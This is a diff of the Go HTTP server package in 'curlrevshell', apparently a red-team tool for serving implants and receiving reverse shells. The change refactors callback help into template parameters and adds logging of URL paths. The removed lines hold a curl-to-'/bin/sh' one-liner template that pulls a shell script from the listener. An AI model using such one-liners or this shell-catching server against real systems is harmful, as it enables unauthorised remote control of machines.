@@ -6,7 +6,7 @@ package hsrv
  * HTTP server
  * By J. Stuart McMurray
  * Created 20240324
- * Last Modified 20250611
+ * Last Modified 20250924
  */
 
 import (
@@ -20,45 +20,31 @@ import (
 	"net"
 	"net/http"
 	"net/netip"
-	"os"
+	"reflect"
 	"slices"
 	"strconv"
 	"strings"
-	"text/template"
 	"time"
 
 	"github.com/magisterquis/curlrevshell/internal/iobroker"
+	"github.com/magisterquis/curlrevshell/lib/crstemplate"
 	"github.com/magisterquis/curlrevshell/lib/ctxerrgroup"
 	"github.com/magisterquis/curlrevshell/lib/opshell"
 	"github.com/magisterquis/curlrevshell/lib/sstls"
-)
-
-const (
-	// CurlFormat prints the start of the curl command used to connect
-	// to us.
-	CurlFormat = `curl -sk --pinnedpubkey sha256//%s https://%s`
-
-	// FileSuffix is added to CurlFormat when telling the user how to get
-	// a file.
-	FileSuffix = ""
-
-	// ShellSuffix is added to CurlFormat when telling the user haw to get
-	// a shell.
-	ShellSuffix = "/c | /bin/sh"
-
-	// ShutdownWait is how long we wait for cilents to disconnect on
-	// shutdown.
-	ShutdownWait = 4 * time.Second
 )
 
 // Log messages and keys.
 const (
 	LMListening               = "Listener started"
 	LMOneShellClosingListener = "Got one shell, closing listener"
+	LMURLPaths                = "Non-Default URL Paths"
 
 	LKError      = "error"
 	LKListenAddr = "address"
 )
+
+// ShutdownWait is how long we wait for cilents to disconnect on shutdown.
+const ShutdownWait = 4 * time.Second
 
 // ErrOneShellClosed indicates that the listener was closed as expected after
 // receiving a single shell.
@@ -67,7 +53,6 @@ var ErrOneShellClosed = errors.New("closed after shell received")
 // Server serves implants over HTTPS.
 type Server struct {
 	sl       *slog.Logger
-	fdir     string /* Static files directory. */
 	ich      <-chan string
 	och      chan<- opshell.CLine
 	iob      *iobroker.Broker
@@ -76,36 +61,38 @@ type Server struct {
 	oneShell bool      /* Close listener after getting a shell. */
 
 	/* Template generation. */
-	tmplf   string             /* Template file. */
-	defTmpl *template.Template /* Default template, for testing. */
+	tmplf  string /* Template file. */
+	params crstemplate.Params
 
 	/* Things for printing help. */
-	cbAddrs   []string
 	lAddrs    []string /* Listen addresses, for help. */
-	cbHelp    string   /* Callback help text. */
 	printIPv6 bool
 }
 
 // New returns a new Server, listening on addr.  Call its Do method to start it
 // serving.
-// Static files will be served from fdir, if non-empty.  If
-// tmplf is non-empty, it is taken as a file from which to read the callback
+// tmplf is non-empty, it is taken as a file from which to read the -template
 // template.
+// params.StaticFilesDir and params.URLPaths may be set by the caller; all
+// other fields will be set by New or its handlers.
 func New(
 	sl *slog.Logger,
-	addr string,
-	fdir string,
-	tmplf string,
-	ich <-chan string,
-	och chan<- opshell.CLine,
+	addr string, /* Listen address. */
+	tmplf string, /* Template file. */
+	ich <-chan string, /* Stdin -> Shell. */
+	och chan<- opshell.CLine, /* Stdout <- Shell. */
 	iob *iobroker.Broker,
-	certFile string,
+	certFile string, /* Cert cache file. */
 	cbAddrs []string, /* Callback addresses, for one-liners. */
-	printIPv6 bool,
+	printIPv6 bool, /* Print IPv6 interface addresses. */
 	oneShell bool, /* Shut down listener after first shell. */
 	printDebug bool, /* Send the user debug (red) messages. */
+	params crstemplate.Params, /* Template params. */
 ) (*Server, error) {
 	var l sstls.Listener
+
+	/* Make sure we actually have URL Paths. */
+	crstemplate.CleanURLPaths(&params.URLPaths)
 
 	/* Make sure the listen address has a port, and if not ask the OS to
 	choose one for us. */
@@ -118,6 +105,8 @@ func New(
 	if l, err = sstls.Listen("tcp", addr, "", 0, certFile); nil != err {
 		return nil, fmt.Errorf("listening on %s: %w", addr, err)
 	}
+	params.ListenAddress = l.Addr().String()
+	params.PubkeyFP = l.Fingerprint
 	sl.Info(LMListening, LKListenAddr, l.Addr().String())
 
 	/* Work out where to send debug messages. */
@@ -129,21 +118,19 @@ func New(
 	/* Server to return. */
 	s := &Server{
 		sl:        sl,
-		fdir:      fdir,
 		ich:       ich,
 		och:       och,
 		iob:       iob,
 		l:         l,
 		dw:        dw,
 		tmplf:     tmplf,
-		defTmpl:   parsedDefaultTemplate,
-		cbAddrs:   cbAddrs,
+		params:    params,
 		printIPv6: printIPv6,
 		oneShell:  oneShell,
 	}
 
 	/* Work out our listen addresses, for user help. */
-	if s.lAddrs, err = s.listenAddresses(); nil != err {
+	if s.lAddrs, err = s.listenAddresses(cbAddrs); nil != err {
 		l.Close()
 		return nil, fmt.Errorf(
 			"determining listen addresses: %w",
@@ -154,20 +141,17 @@ func New(
 		l.Close()
 		return nil, errors.New("no listen addresses")
 	}
+	params.CallbackAddresses = slices.Clone(s.lAddrs)
 
-	/* Help text for user getting a callback. */
-	sb := new(strings.Builder)
-	sb.WriteRune('\n')
-	for _, la := range s.lAddrs {
-		fmt.Fprintf(
-			sb,
-			CurlFormat+ShellSuffix+"\n",
-			s.l.Fingerprint,
-			la,
+	/* Log the paths we're using if they're not the defaults. */
+	if s.params.URLPaths != crstemplate.DefaultURLPaths {
+		sl.LogAttrs(
+			context.Background(),
+			slog.LevelInfo,
+			LMURLPaths,
+			slogAttrsFromURLPaths(s.params.URLPaths)...,
 		)
 	}
-	sb.WriteRune('\n')
-	s.cbHelp = sb.String()
 
 	return s, nil
 }
@@ -186,33 +170,12 @@ func (s *Server) Do(ctx context.Context) error {
 	s.Logf(opshell.ColorNone, "Listening on %s", s.l.Addr())
 
 	/* Tell user where to get static files. */
-	if "" != s.fdir && 0 != len(s.lAddrs) {
-		s.Logf(ScriptColor, "To get files from %s:", s.fdir)
-		s.Printf(ScriptColor, "\n")
-		for _, a := range s.lAddrs {
-			s.Printf(
-				ScriptColor,
-				CurlFormat+FileSuffix,
-				s.l.Fingerprint,
-				a,
-			)
-		}
-		s.Printf(ScriptColor, "\n")
+	if "" != s.params.StaticFilesDir {
+		s.printStaticFileHelp()
 	}
 
 	/* Tell user how to get a callback. */
 	s.printCallbackHelp()
-
-	/* Warn someone if we have a template filename but no template. */
-	if "" != s.tmplf {
-		if _, err := os.ReadFile(s.tmplf); nil != err {
-			s.ErrorLogf(
-				"Warning: Template file %s not readable: %s",
-				s.tmplf,
-				err,
-			)
-		}
-	}
 
 	/* Serve clients and watch events. */
 	eg, ectx := ctxerrgroup.WithContext(ctx)
@@ -226,8 +189,8 @@ func (s *Server) Do(ctx context.Context) error {
 	return eg.Wait()
 }
 
-// listenAddresseses gets all of the addresses we have for the box.
-func (s *Server) listenAddresses() ([]string, error) {
+// listenAddresseses gets all of the addresses we have for the box, sorted.
+func (s *Server) listenAddresses(cbAddrs []string) ([]string, error) {
 	var addrs []string
 
 	/* Parse the listen address and port, which we'll need for
@@ -244,7 +207,7 @@ func (s *Server) listenAddresses() ([]string, error) {
 	port := strconv.Itoa(int(ap.Port()))
 
 	/* Add extra addresses, for just in case. */
-	for _, a := range s.cbAddrs {
+	for _, a := range cbAddrs {
 		/* Make sure we have a port. */
 		if _, p, err := net.SplitHostPort(a); "" == p || nil != err {
 			a = net.JoinHostPort(a, port)
@@ -311,14 +274,6 @@ func (s *Server) listenAddresses() ([]string, error) {
 	}
 
 	return addrs, nil
-}
-
-// printCallbackHelp prints a friendly message to the user instructing him how to
-// get a callback.
-func (s *Server) printCallbackHelp() {
-	/* Tell the user how to get a callback. */
-	s.Logf(ScriptColor, "To get a shell:")
-	s.Printf(ScriptColor, "%s", s.cbHelp)
 }
 
 // watchIOBEvents watches for events from the IO Broker and takes action.  Its
@@ -430,4 +385,23 @@ func sortAddresses(as []string) []string {
 		return 0
 	})
 	return slices.Compact(as)
+}
+
+// slogAttrsFromURLPaths turns p.URLPaths into Attrs suitable for sending to
+// one of slog.Logger's methods.
+func slogAttrsFromURLPaths(p crstemplate.URLPaths) []slog.Attr {
+	/* Introspect the URLPaths in p. */
+	v := reflect.ValueOf(p)
+	t := v.Type()
+	/* We'll return as many attrs as there are paths. */
+	ret := make([]slog.Attr, t.NumField())
+	/* Grab each path and turn into an attr. */
+	for i := range ret {
+		ret[i] = slog.String(t.Field(i).Name, v.Field(i).String())
+	}
+	/* Sort, which makes testing that much easier. */
+	slices.SortFunc(ret, func(a, b slog.Attr) int {
+		return strings.Compare(a.Key, b.Key)
+	})
+	return ret
 }
